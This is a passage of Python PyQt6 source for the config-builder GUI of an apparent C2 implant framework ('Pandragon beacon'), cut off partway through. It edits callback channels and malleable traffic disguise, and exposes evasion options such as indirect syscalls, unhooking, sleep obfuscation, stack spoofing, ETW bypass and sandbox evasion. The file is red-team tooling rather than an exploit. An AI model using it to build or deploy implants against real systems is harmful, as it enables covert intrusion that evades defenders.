"""
Config Builder Widget

Full-featured visual editor for Pandragon beacon configurations.
Provides tabbed sections for all config properties and a Build
button that invokes the config builder toolchain.
"""

import json
import os
import sys
import tempfile
from typing import Optional
from datetime import datetime, timezone

from PyQt6.QtWidgets import (
    QWidget, QVBoxLayout, QHBoxLayout, QFormLayout, QGroupBox,
    QLabel, QLineEdit, QSpinBox, QComboBox, QCheckBox,
    QPushButton, QTableWidget, QTableWidgetItem, QHeaderView,
    QTabWidget, QScrollArea, QTextEdit,
    QDialog, QDialogButtonBox, QMessageBox, QFileDialog,
    QDateEdit, QProgressBar, QListWidget, QListWidgetItem, QStyledItemDelegate,
    QStyle, QInputDialog
)
from PyQt6.QtCore import Qt, QDate, QThread, pyqtSignal, QObject, QRectF, QSize
from PyQt6.QtGui import (
    QFont, QPainter, QColor, QPen, QPainterPath, QPalette,
)

# ---------------------------------------------------------------------------
# Schema loading
# ---------------------------------------------------------------------------

_SCHEMA_PATH = os.path.join(
    os.path.dirname(os.path.abspath(__file__)), "..", "..",
    "Beacon", "config", "schema.json",
)

def _load_schema() -> dict:
    try:
        with open(_SCHEMA_PATH) as f:
            return json.load(f)
    except Exception:
        return {}

_SCHEMA = _load_schema()
_PROPS = _SCHEMA.get("properties", {})

def _prop_schema(prop_name: str) -> dict:
    return _PROPS.get(prop_name, {})

def _create_schema_widget(prop_schema: dict, value=None):
    typ = prop_schema.get("type")
    default = prop_schema.get("default")
    desc = prop_schema.get("description", "")
    current = value if value is not None else default

    if typ == "boolean":
        w = QCheckBox(desc)
        if current is not None:
            w.setChecked(bool(current))
        return w

    if typ == "integer":
        w = QSpinBox()
        w.setRange(prop_schema.get("minimum", 0), prop_schema.get("maximum", 2**31 - 1))
        w.setToolTip(desc)
        val = int(current) if current is not None else 0
        w.setValue(val)
        return w

    if typ == "string" and "enum" in prop_schema:
        w = QComboBox()
        w.addItems(prop_schema["enum"])
        if current is not None:
            w.setCurrentText(str(current))
        w.setToolTip(desc)
        return w

    if typ == "string":
        w = QLineEdit()
        w.setPlaceholderText(desc)
        if current is not None:
            w.setText(str(current))
        return w

    return QLabel(f"(unsupported schema type: {typ})")

def _schema_widget_value(w):
    if isinstance(w, QCheckBox):
        return w.isChecked()
    if isinstance(w, QSpinBox):
        return w.value()
    if isinstance(w, QComboBox):
        return w.currentText()
    if isinstance(w, QLineEdit):
        return w.text().strip()
    return None

def _schema_widget_set(w, value):
    if isinstance(w, QCheckBox):
        w.setChecked(bool(value) if value is not None else False)
    elif isinstance(w, QSpinBox):
        w.setValue(int(value) if value is not None else 0)
    elif isinstance(w, QComboBox):
        w.setCurrentText(str(value) if value is not None else "")
    elif isinstance(w, QLineEdit):
        w.setText(str(value) if value is not None else "")

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

_DEFAULT_CONFIG = {
    "c2_channels": [
        {
            "type": "HTTPS",
            "host": "127.0.0.1",
            "port": 6767,
            "poll_path": "/api/poll",
            "submit_path": "/api/checkin",
            "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "max_consecutive_failures": 5,
            "backoff_sleep_ms": 10000,
        }
    ],
    "sleep_ms": 5000,
    "jitter_pct": 20,
    "use_indirect_syscalls": False,
    "indirect_syscall_pivot": "",
    "lazy_checkin": False,
    "lazy_checkin_max": 2,
    "lazy_unhook": False,
    "pad": False,
    "pad_max": 1024,
    "sleep_obfuscation": "none",
    "sleep_wipe_pe_headers": False,
    "sleep_stack_spoof": False,
    "num_spoof_frames": 6,
    "stack_spoof_chain": [
        {"module": "ntdll.dll", "function": "RtlUserThreadStart"},
        {"module": "kernel32.dll", "function": "BaseThreadInitThunk"},
    ],
    "kill_date": "",
    "options": {
        "sandbox_evasion": False,
        "debug_mode": False,
        "bypass_etw": False,
        "validate_ssl": False,
    },
    "poll_malleable_config": {
        "wrapper": {"prefix": "", "suffix": ""},
        "http_headers": [],
        "payload_location": {"type": "query_param", "param_name": "q", "body_content_type": "text/plain"},
    },
    "submit_malleable_config": {
        "wrapper": {"prefix": "", "suffix": ""},
        "http_headers": [],
        "payload_location": {"type": "body", "body_content_type": "text/plain"},
    },
    "poll_response_malleable_config": {
        "wrapper": {"prefix": "", "suffix": ""},
        "headers": {},
        "status_code": 200,
        "payload_location": {"type": "body"},
    },
    "submit_response_malleable_config": {
        "wrapper": {"prefix": "", "suffix": ""},
        "headers": {},
        "status_code": 200,
        "payload_location": {"type": "body"},
    },
    "work_hours": {
        "enabled": False,
        "start_hour": 9,
        "start_minute": 0,
        "end_hour": 17,
        "end_minute": 0,
        "insomnia": False,
    },
    "spawnto": {
        "x64": "C:\\Windows\\System32\\rundll32.exe",
        "x86": "C:\\Windows\\SysWOW64\\rundll32.exe",
    },
}


def _project_root() -> str:
    """Return absolute path to the pandragon project root."""
    return os.path.abspath(os.path.join(os.path.dirname(__file__), "..", ".."))


def _default_json_path() -> str:
    return os.path.join(_project_root(), "Beacon", "config", "default.json")


# ---------------------------------------------------------------------------
# C2 Channel Edit Dialog
# ---------------------------------------------------------------------------

class _MalleableForm(QWidget):
    """Reusable form for editing one malleable config block inside a channel dialog."""

    _POLL_TYPES = ["query_param", "path"]
    _SUBMIT_TYPES = ["body", "query_param", "path"]
    _RESPONSE_LOCATION_TYPES = ["body", "query_param", "path"]

    def __init__(self, label: str, block_key: str, config: dict, is_response: bool, parent=None):
        super().__init__(parent)
        self._block_key = block_key
        self._is_response = is_response
        self._config = config
        self._mc = config.get(block_key, {})

        layout = QVBoxLayout(self)
        form = QFormLayout()
        layout.addLayout(form)

        self._enabled = QCheckBox(f"Custom {label.lower()} config")
        self._enabled.setChecked(block_key in config)
        self._enabled.toggled.connect(self._on_toggled)
        form.addRow(self._enabled)

        wrapper = self._mc.get("wrapper", {})
        self._prefix = QLineEdit(wrapper.get("prefix", ""))
        self._prefix.setPlaceholderText("REQ_${RAND_B64:4}_")
        self._prefix.setEnabled(self._enabled.isChecked())
        form.addRow("Prefix", self._prefix)

        self._suffix = QLineEdit(wrapper.get("suffix", ""))
        self._suffix.setPlaceholderText("_${JUNK:8}")
        self._suffix.setEnabled(self._enabled.isChecked())
        form.addRow("Suffix", self._suffix)

        pl = self._mc.get("payload_location", {})
        pl_types = self._POLL_TYPES if "poll" in block_key and not is_response else self._SUBMIT_TYPES
        self._pl_type = QComboBox()
        self._pl_type.addItems(pl_types)
        self._pl_type.setCurrentText(pl.get("type", pl_types[0]))
        self._pl_type.setEnabled(self._enabled.isChecked())
        form.addRow("Payload Location", self._pl_type)

        self._pl_param = QLineEdit(pl.get("param_name", ""))
        self._pl_param.setPlaceholderText("query parameter name")
        self._pl_param.setEnabled(self._enabled.isChecked())
        form.addRow("Param Name", self._pl_param)

        self._pl_path_prefix = QLineEdit(pl.get("path_prefix", ""))
        self._pl_path_prefix.setPlaceholderText("/api/")
        self._pl_path_prefix.setEnabled(self._enabled.isChecked())
        form.addRow("Path Prefix", self._pl_path_prefix)

        self._pl_path_suffix = QLineEdit(pl.get("path_suffix", ""))
        self._pl_path_suffix.setPlaceholderText(".png")
        self._pl_path_suffix.setEnabled(self._enabled.isChecked())
        form.addRow("Path Suffix", self._pl_path_suffix)

        self._pl_body_ct = QComboBox()
        self._pl_body_ct.addItems(["text/plain", "application/octet-stream"])
        self._pl_body_ct.setCurrentText(pl.get("body_content_type", "text/plain"))
        self._pl_body_ct.setEnabled(self._enabled.isChecked())
        form.addRow("Body Content-Type", self._pl_body_ct)

        self._pl_cookie = QLineEdit(pl.get("cookie_name", ""))
        self._pl_cookie.setPlaceholderText("cookie name")
        self._pl_cookie.setEnabled(self._enabled.isChecked())
        form.addRow("Cookie Name", self._pl_cookie)

        if is_response:
            self._status_code = QSpinBox()
            self._status_code.setRange(100, 599)
            self._status_code.setValue(self._mc.get("status_code", 200))
            self._status_code.setEnabled(self._enabled.isChecked())
            form.addRow("Status Code", self._status_code)

            self._body_template = QLineEdit(self._mc.get("body_template", ""))
            self._body_template.setPlaceholderText("{{PAYLOAD}}")
            self._body_template.setEnabled(self._enabled.isChecked())
            form.addRow("Body Template", self._body_template)

            self._resp_hdr_table = QTableWidget(0, 2)
            self._resp_hdr_table.setHorizontalHeaderLabels(["Name", "Value"])
            self._resp_hdr_table.horizontalHeader().setStretchLastSection(True)
            self._resp_hdr_table.setMaximumHeight(120)
            self._resp_hdr_table.setEnabled(self._enabled.isChecked())
            form.addRow("Response Headers", self._resp_hdr_table)

            hdr_btns = QHBoxLayout()
            self._resp_hdr_add = QPushButton("Add")
            self._resp_hdr_add.clicked.connect(self._resp_hdr_add_row)
            self._resp_hdr_add.setEnabled(self._enabled.isChecked())
            hdr_btns.addWidget(self._resp_hdr_add)
            self._resp_hdr_remove = QPushButton("Remove")
            self._resp_hdr_remove.clicked.connect(self._resp_hdr_remove_row)
            self._resp_hdr_remove.setEnabled(self._enabled.isChecked())
            hdr_btns.addWidget(self._resp_hdr_remove)
            hdr_btns.addStretch()
            form.addRow(hdr_btns)

            self._populate_resp_headers()

        layout.addStretch()

    def _populate_resp_headers(self):
        if not self._is_response:
            return
        hdrs = self._mc.get("headers", {})
        self._resp_hdr_table.setRowCount(len(hdrs))
        for i, (k, v) in enumerate(hdrs.items()):
            self._resp_hdr_table.setItem(i, 0, QTableWidgetItem(k))
            self._resp_hdr_table.setItem(i, 1, QTableWidgetItem(v))

    def _resp_hdr_add_row(self):
        row = self._resp_hdr_table.rowCount()
        self._resp_hdr_table.insertRow(row)
        self._resp_hdr_table.setItem(row, 0, QTableWidgetItem(""))
        self._resp_hdr_table.setItem(row, 1, QTableWidgetItem(""))

    def _resp_hdr_remove_row(self):
        row = self._resp_hdr_table.currentRow()
        if row >= 0:
            self._resp_hdr_table.removeRow(row)

    def _on_toggled(self, enabled: bool):
        children = [self._prefix, self._suffix, self._pl_type, self._pl_param,
                    self._pl_path_prefix, self._pl_path_suffix, self._pl_body_ct,
                    self._pl_cookie]
        if self._is_response:
            children += [self._status_code, self._body_template,
                         self._resp_hdr_table, self._resp_hdr_add, self._resp_hdr_remove]
        for w in children:
            w.setEnabled(enabled)

    def save(self, out: dict):
        if not self._enabled.isChecked():
            out.pop(self._block_key, None)
            return
        block = {
            "wrapper": {
                "prefix": self._prefix.text().strip(),
                "suffix": self._suffix.text().strip(),
            },
            "payload_location": {
                "type": self._pl_type.currentText(),
                "param_name": self._pl_param.text().strip(),
                "path_prefix": self._pl_path_prefix.text().strip(),
                "path_suffix": self._pl_path_suffix.text().strip(),
                "body_content_type": self._pl_body_ct.currentText(),
                "cookie_name": self._pl_cookie.text().strip(),
            },
        }
        if self._is_response:
            block["status_code"] = self._status_code.value()
            bt = self._body_template.text().strip()
            if bt:
                block["body_template"] = bt
            hdrs = {}
            for i in range(self._resp_hdr_table.rowCount()):
                k = self._resp_hdr_table.item(i, 0)
                v = self._resp_hdr_table.item(i, 1)
                if k and v and k.text().strip():
                    hdrs[k.text().strip()] = v.text().strip()
            block["headers"] = hdrs
        out[self._block_key] = block


class _C2ChannelDialog(QDialog):
    """Dialog for adding or editing a C2 channel."""

    def __init__(self, channel: Optional[dict] = None, parent=None):
        super().__init__(parent)
        self.setWindowTitle("C2 Channel")
        self.setMinimumWidth(640)
        self._channel = channel or {}

        tabs = QTabWidget(self)
        main_tab = QWidget()

        # ── Main tab ─────────────────────────────────────────────
        main_layout = QFormLayout(main_tab)

        self._type = QComboBox()
        self._type.addItems(["HTTP", "HTTPS", "TCP", "PIPE"])
        self._type.setCurrentText(self._channel.get("type", "HTTPS"))
        main_layout.addRow("Type", self._type)

        self._host = QLineEdit(self._channel.get("host", ""))
        self._host.setPlaceholderText("127.0.0.1")
        main_layout.addRow("Host", self._host)

        self._port = QSpinBox()
        self._port.setRange(1, 65535)
        self._port.setValue(self._channel.get("port", 6767))
        main_layout.addRow("Port", self._port)

        self._poll_path = QLineEdit(self._channel.get("poll_path", ""))
        self._poll_path.setPlaceholderText("/api/poll")
        main_layout.addRow("Poll Path", self._poll_path)

        self._submit_path = QLineEdit(self._channel.get("submit_path", ""))
        self._submit_path.setPlaceholderText("/api/checkin")
        main_layout.addRow("Submit Path", self._submit_path)

        self._ua = QLineEdit(self._channel.get("user_agent", ""))
        self._ua.setPlaceholderText("Mozilla/5.0 ...")
        main_layout.addRow("User-Agent", self._ua)

        self._max_fail = QSpinBox()
        self._max_fail.setRange(1, 100)
        self._max_fail.setValue(self._channel.get("max_consecutive_failures", 5))
        main_layout.addRow("Max Failures", self._max_fail)

        self._backoff = QSpinBox()
        self._backoff.setRange(1000, 300000)
        self._backoff.setSingleStep(1000)
        self._backoff.setValue(self._channel.get("backoff_sleep_ms", 10000))
        main_layout.addRow("Backoff (ms)", self._backoff)

        # ── Malleable tab ────────────────────────────────────────
        self._malleable_tabs = QTabWidget()
        self._mc_poll = _MalleableForm("poll", "poll_malleable_config", self._channel, is_response=False)
        self._mc_submit = _MalleableForm("submit", "submit_malleable_config", self._channel, is_response=False)
        self._mc_poll_resp = _MalleableForm("poll response", "poll_response_malleable_config", self._channel, is_response=True)
        self._mc_submit_resp = _MalleableForm("submit response", "submit_response_malleable_config", self._channel, is_response=True)
        self._malleable_tabs.addTab(self._mc_poll, "Poll")
        self._malleable_tabs.addTab(self._mc_submit, "Submit")
        self._malleable_tabs.addTab(self._mc_poll_resp, "Poll Response")
        self._malleable_tabs.addTab(self._mc_submit_resp, "Submit Response")

        # ── Assemble ─────────────────────────────────────────────
        tabs.addTab(main_tab, "General")
        tabs.addTab(self._malleable_tabs, "Malleable")

        outer = QVBoxLayout(self)
        outer.addWidget(tabs)

        buttons = QDialogButtonBox(
            QDialogButtonBox.StandardButton.Ok | QDialogButtonBox.StandardButton.Cancel
        )
        buttons.accepted.connect(self.accept)
        buttons.rejected.connect(self.reject)
        outer.addWidget(buttons)

    def get_channel(self) -> dict:
        ch = {
            "type": self._type.currentText(),
            "host": self._host.text().strip(),
            "port": self._port.value(),
            "poll_path": self._poll_path.text().strip(),
            "submit_path": self._submit_path.text().strip(),
            "user_agent": self._ua.text().strip(),
            "max_consecutive_failures": self._max_fail.value(),
            "backoff_sleep_ms": self._backoff.value(),
        }
        self._mc_poll.save(ch)
        self._mc_submit.save(ch)
        self._mc_poll_resp.save(ch)
        self._mc_submit_resp.save(ch)
        return ch


# ---------------------------------------------------------------------------
# Config Builder Widget
# ---------------------------------------------------------------------------

# ---------------------------------------------------------------------------
# Build Worker (runs in background thread)
# ---------------------------------------------------------------------------

class _BuildWorker(QObject):
    """Performs the build pipeline in a background thread."""

    progress = pyqtSignal(str)
    error = pyqtSignal(str)
    finished = pyqtSignal()

    def __init__(self, config: dict, parent=None):
        super().__init__(parent)
        self._config = config
        self._cancelled = False

    def cancel(self):
        self._cancelled = True

    def run(self):
        try:
            channels = self._config.get("c2_channels", [])
            if not channels:
                self.error.emit("At least one C2 channel is required.")
                return

            tmp = tempfile.NamedTemporaryFile(
                mode="w", suffix=".json", delete=False, prefix="pandragon_cfg_"
            )
            try:
                json.dump(self._config, tmp, indent=2)
                tmp.close()

                try:
                    from pandragon_config_builder import (
                        validate_config, build_config_blob,
                        generate_cpp_header, sync_beacon_to_server,
                    )
                except ImportError:
                    _tools_src = os.path.join(_project_root(), "tools", "src")
                    if _tools_src not in sys.path:
                        sys.path.insert(0, _tools_src)
                    from pandragon_config_builder import (
                        validate_config, build_config_blob,
                        generate_cpp_header, sync_beacon_to_server,
                    )

                if self._cancelled:
                    return

                errors = validate_config(self._config)
                if errors:
                    msg = (
                        "Validation errors:\n  " + "\n  ".join(errors)
                        if isinstance(errors, list)
                        else f"Validation error: {errors}"
                    )
                    self.error.emit(msg)
                    return

                self.progress.emit("Building config blob...")
                blob, nonce, config_key = build_config_blob(self._config)
                self.progress.emit(
                    f"Blob size: {len(blob)} bytes | Config key: {config_key.hex()}"
                )

                if self._cancelled:
                    return

                bin_dir = os.path.join(_project_root(), "Beacon", "config")
                os.makedirs(bin_dir, exist_ok=True)
                bin_path = os.path.join(bin_dir, "default.bin")
                with open(bin_path, "wb") as f:
                    f.write(blob)
                self.progress.emit(f"Wrote: {bin_path}")

                include_dir = os.path.join(bin_dir, "include")
                os.makedirs(include_dir, exist_ok=True)
                header_path = os.path.join(include_dir, "generated_config.h")
                generate_cpp_header(blob, header_path, nonce, config_key, channels)
                self.progress.emit(f"Wrote: {header_path}")

                crypto_key = self._config.get("crypto_key", "")
                beacon_id = self._config.get("beacon_id", "")
                sync_beacon_to_server(beacon_id, crypto_key, self._config)
                self.progress.emit("Synced to server/known_beacons.json")

                self.progress.emit("\nBuild complete!")
            finally:
                try:
                    os.unlink(tmp.name)
                except Exception:
                    pass
        except Exception as e:
            import traceback
            self.error.emit(f"{e}\n{traceback.format_exc()}")
        finally:
            self.finished.emit()


# ---------------------------------------------------------------------------
# Stack spoof chain: card-based stack view with drag-drop
# ---------------------------------------------------------------------------

class _ChainStackDelegate(QStyledItemDelegate):
    """Paints each chain entry as a connected stack-frame card."""

    USER_HEIGHT = 50
    ANCHOR_HEIGHT = 38

    _small_font = None
    _small_font_locked = None
    _small_font_offset = None

    def paint(self, painter, option, index):
        data = index.data(Qt.ItemDataRole.UserRole)
        if not isinstance(data, dict):
            return

        pal = option.palette
        painter.save()
        painter.setRenderHint(QPainter.RenderHint.Antialiasing)

        is_selected = option.state & QStyle.StateFlag.State_Selected
        is_top = data.get("type") == "anchor_top"
        is_bottom = data.get("type") == "anchor_bottom"
        is_locked = is_top or is_bottom

        rect = option.rect.adjusted(4, 1, -4, -1)

        # ── Continuous vertical connector (spans full item rect) ──
        line_x = rect.x() + 2
        conn_color = pal.color(QPalette.ColorRole.Mid).darker(120)
        painter.setPen(QPen(conn_color, 1))
        painter.drawLine(
            int(line_x), option.rect.top(),
            int(line_x), option.rect.bottom(),
        )

        # ── Card background ──
        if is_locked:
            bg = pal.color(QPalette.ColorRole.AlternateBase)
        elif is_selected:
            hl = pal.color(QPalette.ColorRole.Highlight)
            bg = QColor(hl.red(), hl.green(), hl.blue(), 60)
        else:
            bg = pal.color(QPalette.ColorRole.Base)
        path = QPainterPath()
        path.addRoundedRect(QRectF(rect), 4, 4)
        painter.fillPath(path, bg)

        # ── Card border ──
        if is_selected and not is_locked:
            painter.setPen(
                QPen(pal.color(QPalette.ColorRole.Highlight), 1.2)
            )
        else:
            painter.setPen(QPen(conn_color, 1))
        painter.drawRoundedRect(QRectF(rect), 4, 4)

        # ── Accent bar (on top of connector) ──
        accent = QRectF(line_x, rect.y() + 4, 3, rect.height() - 8)
        if is_locked:
            accent_color = pal.color(QPalette.ColorRole.Mid)
        else:
            accent_color = pal.color(QPalette.ColorRole.Highlight)
        painter.fillRect(accent, accent_color)

        # ── Text ──
        text_x = rect.x() + 12
        text_w = rect.width() - 22

        if is_locked:
            font = option.font
            font.setItalic(True)
            painter.setFont(font)
            painter.setPen(pal.color(QPalette.ColorRole.PlaceholderText))
            label = "pandragon.exe" if is_top else "ntdll.dll!NtContinue"
            tr = QRectF(text_x, rect.y(), text_w, rect.height())
            painter.drawText(
                tr,
                Qt.AlignmentFlag.AlignLeft
                | Qt.AlignmentFlag.AlignVCenter,
                label,
            )

            if self._small_font_locked is None:
                self._small_font_locked = QFont(option.font)
                self._small_font_locked.setPointSize(int(self._small_font_locked.pointSize() * 0.8))
            painter.setFont(self._small_font_locked)
            painter.setPen(pal.color(QPalette.ColorRole.Mid))
            side_label = "<-- RSP" if is_top else "<-- RBP"
            sr = QRectF(text_x - 6, rect.y(), text_w + 12, rect.height())
            painter.drawText(
                sr,
                Qt.AlignmentFlag.AlignRight
                | Qt.AlignmentFlag.AlignVCenter,
                side_label,
            )
        else:
            mod = data.get("module", "")
            fn = data.get("function", "")
            offset_val = data.get("offset", 0)
            off_str = hex(offset_val) if offset_val else "scan"

            lw = text_w - 60

            font = option.font
            font.setBold(True)
            painter.setFont(font)
            painter.setPen(pal.color(QPalette.ColorRole.WindowText))
            mr = QRectF(text_x, rect.y() + 5, lw, 18)
            elided = painter.fontMetrics().elidedText(
                mod, Qt.TextElideMode.ElideRight, int(lw),
            )
            painter.drawText(
                mr,
                Qt.AlignmentFlag.AlignLeft
                | Qt.AlignmentFlag.AlignBottom,
                elided,
            )

            font.setBold(False)
            painter.setFont(font)
            painter.setPen(pal.color(QPalette.ColorRole.WindowText))
            fr = QRectF(text_x, rect.y() + 23, lw, 18)
            elided = painter.fontMetrics().elidedText(
                fn, Qt.TextElideMode.ElideRight, int(lw),
            )
            painter.drawText(
                fr,
                Qt.AlignmentFlag.AlignLeft
                | Qt.AlignmentFlag.AlignTop,
                elided,
            )

            if self._small_font_offset is None:
                self._small_font_offset = QFont(option.font)
                self._small_font_offset.setPointSize(int(self._small_font_offset.pointSize() * 0.85))
                self._small_font_offset.setBold(False)
            painter.setFont(self._small_font_offset)
            painter.setPen(pal.color(QPalette.ColorRole.PlaceholderText))
            or_ = QRectF(text_x, rect.y() + 5, text_w, 36)
            painter.drawText(
                or_,
                Qt.AlignmentFlag.AlignRight
                | Qt.AlignmentFlag.AlignVCenter,
                off_str,
            )

        painter.restore()

    def sizeHint(self, option, index):
        data = index.data(Qt.ItemDataRole.UserRole)
        locked = isinstance(data, dict) and data.get("type") in (
            "anchor_top", "anchor_bottom",
        )
        h = self.ANCHOR_HEIGHT if locked else self.USER_HEIGHT
        return QSize(200, h + 2)


class _ChainStackWidget(QListWidget):
    """QListWidget with internal drag-drop and locked anchor items."""

    chainDropped = pyqtSignal()

    def __init__(self, parent=None):
        super().__init__(parent)
        self.setDragDropMode(QListWidget.DragDropMode.InternalMove)
        self.setDragEnabled(True)
        self.setAcceptDrops(True)
        self.setDropIndicatorShown(True)
        self.setDefaultDropAction(Qt.DropAction.MoveAction)
        self.setSelectionMode(QListWidget.SelectionMode.SingleSelection)
        self.setSpacing(1)
        self.setFrameShape(QListWidget.Shape.NoFrame)
        self.viewport().setAutoFillBackground(False)

    def dropEvent(self, a0):
        pos = a0.position().toPoint()
        item = self.itemAt(pos)
        drop_pos = self.dropIndicatorPosition()
        row = self.row(item) if item else -1
        count = self.count()

        if row < 0:
            a0.ignore()
            return
        if drop_pos in (
            self.DropIndicatorPosition.AboveItem,
            self.DropIndicatorPosition.OnItem,
        ) and row <= 0:
            a0.ignore()
            return
        if drop_pos in (
            self.DropIndicatorPosition.OnItem,
            self.DropIndicatorPosition.BelowItem,
        ) and row >= count - 1:
            a0.ignore()
            return

        super().dropEvent(a0)
        self.chainDropped.emit()


class ConfigBuilderWidget(QWidget):
    """Visual editor for beacon config with build capability."""

    def __init__(self, parent=None):
        super().__init__(parent)
        self._config_path: Optional[str] = None
        self._config: dict = {}
        self._build_output: str = ""
        self._worker: Optional[_BuildWorker] = None
        self._thread: Optional[QThread] = None
        self._api: Optional[object] = None
        self._fields: dict = {}

        self._build_config()

    def set_api(self, api):
        self._api = api
        if api and hasattr(api, '_url') and api._url:
            from urllib.parse import urlparse
            parsed = urlparse(api._url)
            host = parsed.hostname or ""
            if host and host not in ("127.0.0.1", "localhost", "0.0.0.0"):
                self._auto_fill_c2_host(host)

    def _auto_fill_c2_host(self, host: str):
        if self._config.get("c2_channels"):
            for ch in self._config["c2_channels"]:
                if ch.get("host") in ("127.0.0.1", "localhost", ""):
                    ch["host"] = host
            self._refresh_channels_table()
            self._status_label.setText(f"C2 host auto-filled: {host}")

    def _build_config(self):
        layout = QVBoxLayout(self)
        layout.setContentsMargins(4, 4, 4, 4)

        # Toolbar: load / save / reset
        toolbar = QHBoxLayout()
        self._load_btn = QPushButton("Load JSON")
        self._load_btn.clicked.connect(self._load_config)
        toolbar.addWidget(self._load_btn)

        self._save_btn = QPushButton("Save JSON")
        self._save_btn.clicked.connect(self._save_config)
        toolbar.addWidget(self._save_btn)

        self._reset_btn = QPushButton("Reset Defaults")
        self._reset_btn.clicked.connect(self._reset_config)
        toolbar.addWidget(self._reset_btn)

        toolbar.addStretch()
        self._status_label = QLabel("")
        self._status_label.setObjectName("statusLabel")
        toolbar.addWidget(self._status_label)
        layout.addLayout(toolbar)

        # Main tabs
        self._tabs = QTabWidget()
        self._tabs.addTab(self._build_channels_tab(), "C2 Channels")
        self._tabs.addTab(self._build_timing_tab(), "Timing && Obfuscation")
        self._tabs.addTab(self._build_chain_tab(), "Stack Spoof Chain")
        self._tabs.addTab(self._build_malleable_tab(), "Malleable C2")
        self._tabs.addTab(self._build_workhours_tab(), "Work Hours && Spawn-to")
        self._tabs.addTab(self._build_postbuild_tab(), "Post-Build")
        self._tabs.addTab(self._build_preview_tab(), "Request Preview")
        self._tabs.addTab(self._build_build_tab(), "Build")
        layout.addWidget(self._tabs)

    # ── Tab 1: C2 Channels ──────────────────────────────────────────

    def _build_channels_tab(self) -> QWidget:
        tab = QWidget()
        tab.setObjectName("configTab")
        layout = QVBoxLayout(tab)

        self._channels_table = QTableWidget(0, 4)
        self._channels_table.setHorizontalHeaderLabels(
            ["Type", "Host", "Port", "Paths"]
        )
        self._channels_table.horizontalHeader().setStretchLastSection(True)
        self._channels_table.setSelectionBehavior(
            QTableWidget.SelectionBehavior.SelectRows
        )
        layout.addWidget(self._channels_table)

        btn_row = QHBoxLayout()
        self._ch_add = QPushButton("Add")
        self._ch_add.clicked.connect(self._channel_add)
        btn_row.addWidget(self._ch_add)

        self._ch_edit = QPushButton("Edit")
        self._ch_edit.clicked.connect(self._channel_edit)
        btn_row.addWidget(self._ch_edit)

        self._ch_remove = QPushButton("Remove")
        self._ch_remove.clicked.connect(self._channel_remove)
        btn_row.addWidget(self._ch_remove)

        btn_row.addStretch()
        layout.addLayout(btn_row)
        return tab

    def _channel_add(self):
        dialog = _C2ChannelDialog(parent=self)
        if dialog.exec() == QDialog.DialogCode.Accepted:
            ch = dialog.get_channel()
            if "c2_channels" not in self._config:
                self._config["c2_channels"] = []
            self._config["c2_channels"].append(ch)
            self._refresh_channels_table()

    def _channel_edit(self):
        row = self._channels_table.currentRow()
        if row < 0:
            return
        channels = self._config.get("c2_channels", [])
        if row >= len(channels):
            return
        dialog = _C2ChannelDialog(channels[row], parent=self)
        if dialog.exec() == QDialog.DialogCode.Accepted:
            channels[row] = dialog.get_channel()
            self._refresh_channels_table()

    def _channel_remove(self):
        row = self._channels_table.currentRow()
        if row < 0:
            return
        channels = self._config.get("c2_channels", [])
        if 0 <= row < len(channels):
            del channels[row]
            self._refresh_channels_table()

    def _refresh_channels_table(self):
        channels = self._config.get("c2_channels", [])
        self._channels_table.setRowCount(len(channels))
        for i, ch in enumerate(channels):
            self._channels_table.setItem(i, 0, QTableWidgetItem(ch.get("type", "")))
            self._channels_table.setItem(i, 1, QTableWidgetItem(ch.get("host", "")))
            self._channels_table.setItem(
                i, 2, QTableWidgetItem(str(ch.get("port", "")))
            )
            poll = ch.get("poll_path", "")
            submit = ch.get("submit_path", "")
            paths_text = f"{poll} | {submit}" if poll or submit else ""
            paths_item = QTableWidgetItem(paths_text)
            paths_item.setToolTip(f"Poll (GET): {poll}\nSubmit (POST): {submit}")
            self._channels_table.setItem(i, 3, paths_item)
            # Build malleable tooltip
            parts = []
            for key, label in [("poll_malleable_config", "poll"),
                                ("submit_malleable_config", "submit"),
                                ("poll_response_malleable_config", "poll_rsp"),
                                ("submit_response_malleable_config", "submit_rsp")]:
                parts.append(f"{label}={'✓' if key in ch else '—'}")
            tip = "Malleable: " + " | ".join(parts)
            self._channels_table.item(i, 0).setToolTip(tip)
        self._populate_preview_channels()

    # ── Tab 2: Timing & Obfuscation ─────────────────────────────────

    def _build_timing_tab(self) -> QWidget:
        scroll = QScrollArea()
        scroll.setWidgetResizable(True)
        scroll.setFrameShape(QScrollArea.Shape.NoFrame)

        container = QWidget()
        container.setObjectName("configTab")
        layout = QVBoxLayout(container)

        # Timing
        timing_group = QGroupBox("Timing")
        timing_form = QFormLayout(timing_group)
        for name in ("sleep_ms", "jitter_pct"):
            ps = _prop_schema(name)
            w = _create_schema_widget(ps, self._config.get(name))
            if name == "jitter_pct":
                w.setSuffix("%")
            self._fields[name] = w
            timing_form.addRow(ps.get("description", name), w)

        pad_w = _create_schema_widget(_prop_schema("pad"), self._config.get("pad"))
        self._fields["pad"] = pad_w
        timing_form.addRow(pad_w)

        pad_max_w = _create_schema_widget(_prop_schema("pad_max"), self._config.get("pad_max"))
        self._fields["pad_max"] = pad_max_w
        timing_form.addRow("Max Pad (bytes)", pad_max_w)

        self._kill_date = QDateEdit()
        self._kill_date.setCalendarPopup(True)
        self._kill_date.setDate(QDate.currentDate().addYears(1))
        self._kill_date.setSpecialValueText("None")
        kd = self._config.get("kill_date", "")
        if kd:
            try:
                dt = datetime.strptime(kd, "%Y-%m-%d")
                self._kill_date.setDate(QDate(dt.year, dt.month, dt.day))
            except ValueError:
                pass
        timing_form.addRow("Kill Date", self._kill_date)

        layout.addWidget(timing_group)

        # Obfuscation
        obf_group = QGroupBox("Sleep Obfuscation")
        obf_form = QFormLayout(obf_group)

        sleep_obf_w = _create_schema_widget(_prop_schema("sleep_obfuscation"), self._config.get("sleep_obfuscation"))
        self._fields["sleep_obfuscation"] = sleep_obf_w
        sleep_obf_w.currentTextChanged.connect(self._update_conditional_visibility)
        obf_form.addRow("Method", sleep_obf_w)

        wipe_pe_w = _create_schema_widget(_prop_schema("sleep_wipe_pe_headers"), self._config.get("sleep_wipe_pe_headers"))
        self._fields["sleep_wipe_pe_headers"] = wipe_pe_w
        obf_form.addRow(wipe_pe_w)

        self._stack_spoof_row = QWidget()
        stack_spoof_layout = QHBoxLayout(self._stack_spoof_row)
        stack_spoof_layout.setContentsMargins(0, 0, 0, 0)
        stack_spoof_w = _create_schema_widget(_prop_schema("sleep_stack_spoof"), self._config.get("sleep_stack_spoof"))
